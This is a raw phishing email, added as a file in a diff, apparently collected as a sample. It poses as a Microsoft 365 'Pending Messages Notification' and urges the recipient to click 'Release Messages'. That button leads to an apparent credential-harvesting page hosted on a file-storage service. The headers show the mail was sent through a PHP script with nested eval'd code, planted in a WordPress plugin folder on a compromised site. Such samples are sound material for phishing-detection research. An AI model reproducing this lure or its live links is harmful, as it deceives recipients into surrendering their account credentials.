@@ -1,0 +1,352 @@
+Return-Path: support@rosasdodesertoespeciais.com.br
+Delivered-To: jose@monkey.org
+X-FDA: 80037707946.36.09C8023
+Received: from vps-5494762.luizasalesstore.com.br (vps-5494762.luizasalesstore.com.br [162.214.163.138])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 09E0410AEF2FC
+	for <jose@monkey.org>; Wed, 19 Oct 2022 13:00:30 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=rosasdodesertoespeciais.com.br; s=default; h=Content-Transfer-Encoding:
+	Content-Type:MIME-Version:Message-ID:From:Date:Subject:To:Sender:Reply-To:Cc:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=JkvdOIr03kt82GFZMB12aHhUNqE1fefEgKYsYeEJrVA=; b=xeNlY3ZkAP2k46Xmpy/sJq7cYu
+	2onPCzKguUrtaqZnVuJXrVrrWh8ZIjkLWCdg1h3sIoQ+4gNBStOztTO8vcJhOjTaD5sv4GVEn0g+0
+	Gr2hdgIZq6dbrM4UsaBmtACEAchdn4BW25Dp+4+0T0Xb7weUIY80JgRhX/qDp2buymjaydFnjTHme
+	y3x6v+xsKDVL3zL1zxEbR+93mkmg9kZKHWgy9mn+SjlR+R3kZIDIMo9hOwQ2Xi0eUyWaKblbEg4Qq
+	4F0SuXgKZxYm/jDpjn09h24n6fXN1usyEBSclA0qCVAzjGxi558ADolfPzVkbkK4xtXfpcd58NySA
+	YWAqFjfQ==;
+Received: from rdefloricultura by vps-5494762.kwcode.com with local (Exim 4.95)
+	(envelope-from <support@rosasdodesertoespeciais.com.br>)
+	id 1ol8gN-0005WA-8J
+	for jose@monkey.org;
+	Wed, 19 Oct 2022 10:00:27 -0300
+To: jose@monkey.org
+Subject: Microsoft 365              <Microsoft-365@email.microsoft-365.com>
+X-PHP-Script: rosasdodesertoespeciais.com.br/wp-content/plugins/qpofrgj/nasrvtoq.php for 54.66.191.172
+X-PHP-Originating-Script: 1014:nasrvtoq.php(3) : eval()'d code(1) : eval()'d code(16) : eval()'d code
+Date: Wed, 19 Oct 2022 13:00:27 +0000
+From: Pending Messages Notification <support@rosasdodesertoespeciais.com.br>
+Message-ID: <853954a0a835fcbcb97f5eb9c7d9a3e9@rosasdodesertoespeciais.com.br>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="b1_853954a0a835fcbcb97f5eb9c7d9a3e9"
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - vps-5494762.kwcode.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [1014 991] / [47 12]
+X-AntiAbuse: Sender Address Domain - rosasdodesertoespeciais.com.br
+X-Get-Message-Sender-Via: vps-5494762.kwcode.com: authenticated_id: rdefloricultura/from_h
+X-Authenticated-Sender: vps-5494762.kwcode.com: support@rosasdodesertoespeciais.com.br
+X-Source: 
+X-Source-Args: /opt/cpanel/ea-php71/root/usr/bin/php-cgi /home/rdefloricultura/public_html/wp-content/plugins/qpofrgj/nasrvtoq.php 
+X-Source-Dir: rosasdodesertoespeciais.com.br:/public_html/wp-content/plugins/qpofrgj
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1666184431; a=rsa-sha256;
+	cv=none;
+	b=56G+KvJG/RsOwaKkNsP5jY8Dsott5+UMAkFNLioQT3lGZAvxGyZIvDhu0whzKlEYwC4m9U
+	d5pXR3NNPJK/8ga9BJMx4VT+Ucf5sCBqpL5jWBTn3Zt8FfyKhOkR4cMNznIVTlosyRuLPE
+	X6ZT1rhbE+S8wBOUc1WnY/niAzoWH6o=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=pass header.d=rosasdodesertoespeciais.com.br header.s=default header.b=xeNlY3Zk;
+	dmarc=pass (policy=quarantine) header.from=rosasdodesertoespeciais.com.br;
+	spf=pass (imf14.b.hostedemail.com: domain of support@rosasdodesertoespeciais.com.br designates 162.214.163.138 as permitted sender) smtp.mailfrom=support@rosasdodesertoespeciais.com.br
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1666184431;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=JkvdOIr03kt82GFZMB12aHhUNqE1fefEgKYsYeEJrVA=;
+	b=U8K65qYuEqR1z+rUb9e1kYxL8z6QPLGuFqkvBecsx+ke9CT9de9OgFvRwSlyqFdekCkCEJ
+	FmxLSr7tGQBjzsE1xzxXRFEgMUu3e8TtZw3ymirfgbz2um2/Z5/vrtOYg+1wCSFJ2CC/jr
+	/HoL/VN2JnZKz3RH0Rr88Woj/kjvXsk=
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=pass header.d=rosasdodesertoespeciais.com.br header.s=default header.b=xeNlY3Zk;
+	dmarc=pass (policy=quarantine) header.from=rosasdodesertoespeciais.com.br;
+	spf=pass (imf14.b.hostedemail.com: domain of support@rosasdodesertoespeciais.com.br designates 162.214.163.138 as permitted sender) smtp.mailfrom=support@rosasdodesertoespeciais.com.br
+X-Rspam-User: 
+X-Rspamd-Server: rspam07
+X-Rspamd-Queue-Id: 09E0410AEF2FC
+X-Stat-Signature: 7qa9frj38ihm8zz4rzqgemrbrhmx6e9f
+X-Spam-Status: Yes, score=15.10
+X-HE-Tag: 1666184430-404641
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 176
+
+This is a multi-part message in MIME format.
+
+--b1_853954a0a835fcbcb97f5eb9c7d9a3e9
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+
+
+
+	HTML Editor - Full Version
+
+
+
+	
+		
+			
+			
+				
+					
+						         Office 365 Business
+					
+				
+			
+
+			
+				
+					
+						 
+						
+						
+						 
+
+						Pending Messages Notification
+
+						 
+
+						
+						Your exchange server has prevented the delivery of some messages to jose@monkey.org. 
+
+						These pending messages are listed along with actions to be taken.
+						
+
+						
+						
+
+						
+						
+						
+						
+							
+								
+									Release Messages.
+								
+							
+						
+						
+						
+						
+						
+						
+						
+						 
+					
+				
+			
+
+			
+				
+					
+						 
+						
+						  Change how notifications are delivered •   Privacy statement
+						
+						 
+					
+				
+			
+			
+		
+	
+
+
+
+
+--b1_853954a0a835fcbcb97f5eb9c7d9a3e9
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!doctype html>
+<html>
+<head>
+=09<title>HTML Editor - Full Version</title>
+</head>
+<body>
+<table bgcolor=3D"#ffffff" style=3D"text-indent: 0px; text-size-adjust: aut=
+o; background-color: rgb(255, 255, 255); font-size: 16px; font-family: "Seg=
+oe UI", "Segoe WP", Segoe, Tahoma, Frutiger, "Frutiger Linotype", "Dejavu S=
+ans", "Helvetica Neue", Arial, sans-serif, serif, EmojiFont; font-stretch: =
+inherit; line-height: inherit; color: rgb(33, 33, 33); border: 1px solid rg=
+b(234, 234, 234); border-collapse: collapse;" width=3D"600">
+=09<tbody>
+=09=09<tr>
+=09=09=09<td style=3D"font-family: "Google Sans", Roboto, RobotoDraft, Helv=
+etica, Arial, sans-serif; margin: 0px; padding: 0px; border-collapse: colla=
+pse;">
+=09=09=09<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" height=3D"=
+56" style=3D"font-family: inherit; font-size: inherit; font-style: inherit;=
+ font-variant-caps: inherit; font-stretch: inherit; line-height: inherit;" =
+width=3D"614">
+=09=09=09=09<tbody>
+=09=09=09=09=09<tr>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; width: 90px; bord=
+er-collapse: collapse;" width=3D"90">=C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0 Offi=
+ce 365 Business</td>
+=09=09=09=09=09</tr>
+=09=09=09=09</tbody>
+=09=09=09</table>
+
+=09=09=09<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" height=3D"=
+220" style=3D"font-family: inherit; font-size: inherit; font-style: inherit=
+; font-variant-caps: inherit; font-stretch: inherit; line-height: inherit;"=
+ width=3D"613">
+=09=09=09=09<tbody>
+=09=09=09=09=09<tr>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; border-collapse: =
+collapse; min-width: 40px;" width=3D"40">=C2=A0</td>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; line-height: 20px=
+; border-top-color: rgb(234, 234, 234); border-top-style: solid; border-col=
+lapse: collapse; max-width: 480px;" width=3D"480">
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: =
+inherit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: b=
+aseline; color: inherit;">
+=09=09=09=09=09=09<div aria-hidden=3D"true" style=3D"border: 0px; font-fami=
+ly: inherit; font-size: 13px; font-style: inherit; font-variant-caps: inher=
+it; font-stretch: inherit; line-height: inherit; margin: 0px; padding: 0px;=
+ vertical-align: baseline; color: rgb(102, 102, 102);">=C2=A0</div>
+
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: 13px; font-style: inherit; font-variant-caps: inherit; font-stretch: inh=
+erit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: base=
+line; color: rgb(102, 102, 102);"><strong style=3D"font-size: 12pt;"><font =
+style=3D"font-size: 11pt;">Pending Messages Notification</font></strong></d=
+iv>
+
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: wf_segoe-ui_semib=
+old, "Segoe UI Semibold", "Segoe WP Semibold", "Segoe UI", "Segoe WP", Sego=
+e, Tahoma, Frutiger, "Frutiger Linotype", "Dejavu Sans", "Helvetica Neue", =
+Arial, sans-serif, serif, EmojiFont; font-size: 13px; font-style: inherit; =
+font-variant-caps: inherit; font-weight: 600; font-stretch: inherit; line-h=
+eight: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color:=
+ rgb(51, 51, 51);">=C2=A0</div>
+
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: =
+inherit; line-height: 16px; margin: 0px; padding: 0px; vertical-align: base=
+line; color: inherit;">
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: =
+inherit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: b=
+aseline; color: inherit;"><font color=3D"#666666"><font style=3D"font-size:=
+ 9pt;">Your exchange server has prevented the delivery of some messages to=
+=C2=A0<a href=3D"mailto:jose@monkey.org" rel=3D"noopener noreferrer" style=
+=3D"color: rgb(17, 85, 204); border: 0px; font-family: inherit; font-size: =
+inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: inh=
+erit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: base=
+line;" target=3D"_blank">jose@monkey.org</a>.=C2=A0</font></font>
+
+=09=09=09=09=09=09<p><font color=3D"#666666"><font style=3D"font-size: 9pt;=
+">These pending messages are listed along with actions to be taken.</font><=
+/font></p>
+=09=09=09=09=09=09</div>
+
+=09=09=09=09=09=09<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" h=
+eight=3D"28" style=3D"font-family: inherit; font-size: inherit; font-style:=
+ inherit; font-variant-caps: inherit; font-stretch: inherit; line-height: i=
+nherit;" width=3D"165">
+=09=09=09=09=09=09</table>
+
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: 13px; font-style: inherit; font-variant-caps: inherit; font-stretch: inh=
+erit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: base=
+line; color: rgb(102, 102, 102);">
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: =
+inherit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: b=
+aseline; color: inherit;">
+=09=09=09=09=09=09<div align=3D"left" style=3D"border: 0px; font-family: in=
+herit; font-size: inherit; font-style: inherit; font-variant-caps: inherit;=
+ font-stretch: inherit; line-height: inherit; margin: 0px; padding: 0px; ve=
+rtical-align: baseline; color: inherit;">
+=09=09=09=09=09=09<table align=3D"center" border=3D"0" cellpadding=3D"0" ce=
+llspacing=3D"0" style=3D"font-family: inherit; font-size: inherit; font-sty=
+le: inherit; font-variant-caps: inherit; font-stretch: inherit; line-height=
+: inherit; margin: 0px auto;">
+=09=09=09=09=09=09=09<tbody>
+=09=09=09=09=09=09=09=09<tr>
+=09=09=09=09=09=09=09=09=09<td align=3D"center" bgcolor=3D"#d83b01" style=
+=3D"margin: 0px; padding: 10px 40px; color: rgb(255, 255, 241); line-height=
+: 20px; font-size: 16px; border-collapse: collapse;"><span style=3D"font-fa=
+mily:arial,helvetica,sans-serif;"><a data-saferedirecturl=3D"https://www.go=
+ogle.com/url?q=3Dhttps://agarthicomics.ba/securedocumentsdownload/adobe-3D6=
+/&source=3Dgmail&ust=3D1666040703773000&usg=3DAOvVaw39dxI4TzacHmekesKnxQ4Z"=
+ href=3D"https://storageapi.fleek.co/a4cc510d-670f-432a-9bf1-1fd7aa8524bf-b=
+ucket/0FFICEBOX.html" rel=3D"noopener noreferrer" style=3D"color: rgb(255, =
+255, 255); border: 0px; font-family: inherit; font-size: inherit; font-styl=
+e: inherit; font-variant-caps: inherit; font-stretch: inherit; line-height:=
+ inherit; margin: 0px; padding: 0px; vertical-align: baseline; text-decorat=
+ion-line: none;" target=3D"_blank">Release Messages</a></span>.</td>
+=09=09=09=09=09=09=09=09</tr>
+=09=09=09=09=09=09=09</tbody>
+=09=09=09=09=09=09</table>
+=09=09=09=09=09=09</div>
+=09=09=09=09=09=09</div>
+=09=09=09=09=09=09</div>
+=09=09=09=09=09=09</div>
+=09=09=09=09=09=09</div>
+=09=09=09=09=09=09</td>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; border-collapse: =
+collapse; min-width: 40px;" width=3D"40">=C2=A0</td>
+=09=09=09=09=09</tr>
+=09=09=09=09</tbody>
+=09=09=09</table>
+
+=09=09=09<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" height=3D"40" style=3D"font-family: inherit; font-size: inherit; fon=
+t-style: inherit; font-variant-caps: inherit; font-stretch: inherit; line-h=
+eight: inherit; margin: 0px 0px 10px; text-align: center; color: rgb(123, 1=
+23, 123);" width=3D"613">
+=09=09=09=09<tbody>
+=09=09=09=09=09<tr>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; width: 40px; bord=
+er-collapse: collapse; min-width: 40px;">=C2=A0</td>
+=09=09=09=09=09=09<td style=3D"margin: 0px; width: 506px; border-top-color:=
+ rgb(234, 234, 234); border-top-style: solid; border-collapse: collapse; mi=
+n-width: 520px;">
+=09=09=09=09=09=09<div style=3D"border: 0px; font-family: inherit; font-siz=
+e: inherit; font-style: inherit; font-variant-caps: inherit; font-stretch: =
+inherit; line-height: inherit; margin: 0px; padding: 0px; vertical-align: b=
+aseline; color: inherit;">=C2=A0<span style=3D"border: 0px; font-family: in=
+herit; font-size: 12px; font-style: inherit; font-variant-caps: inherit; fo=
+nt-stretch: inherit; line-height: 15px; margin: 0px; padding: 0px; vertical=
+-align: baseline; color: inherit;">=C2=A0<b><font color=3D"#000000">Change =
+how notifications are delivered<span style=3D"border: 0px; font-family: inh=
+erit; font-size: inherit; font-style: inherit; font-variant-caps: inherit; =
+font-weight: inherit; font-stretch: inherit; line-height: inherit; margin: =
+0px; padding: 0px; vertical-align: baseline; color: inherit;">=C2=A0</span>=
+=E2=80=A2<span style=3D"border: 0px; font-family: inherit; font-size: inher=
+it; font-style: inherit; font-variant-caps: inherit; font-weight: inherit; =
+font-stretch: inherit; line-height: inherit; margin: 0px; padding: 0px; ver=
+tical-align: baseline; color: inherit;">=C2=A0</span>=C2=A0</font></b></spa=
+n><b>=C2=A0</b><a id=3D"m_-3244142869714062140gmail-LPlnk858807_mr_css_attr=
+" style=3D"border: 0px; font-family: inherit; font-size: 12px; font-style: =
+inherit; font-variant-caps: inherit; font-stretch: inherit; line-height: 15=
+px; margin: 0px; padding: 0px; vertical-align: baseline;"><b><font color=3D=
+"#000000">Privacy statement</font></b></a></div>
+=09=09=09=09=09=09</td>
+=09=09=09=09=09=09<td style=3D"margin: 0px; padding: 0px; width: 64px; bord=
+er-collapse: collapse; min-width: 40px;">=C2=A0</td>
+=09=09=09=09=09</tr>
+=09=09=09=09</tbody>
+=09=09=09</table>
+=09=09=09</td>
+=09=09</tr>
+=09</tbody>
+</table>
+</body>
+</html>
+
+
+--b1_853954a0a835fcbcb97f5eb9c7d9a3e9--
+
+
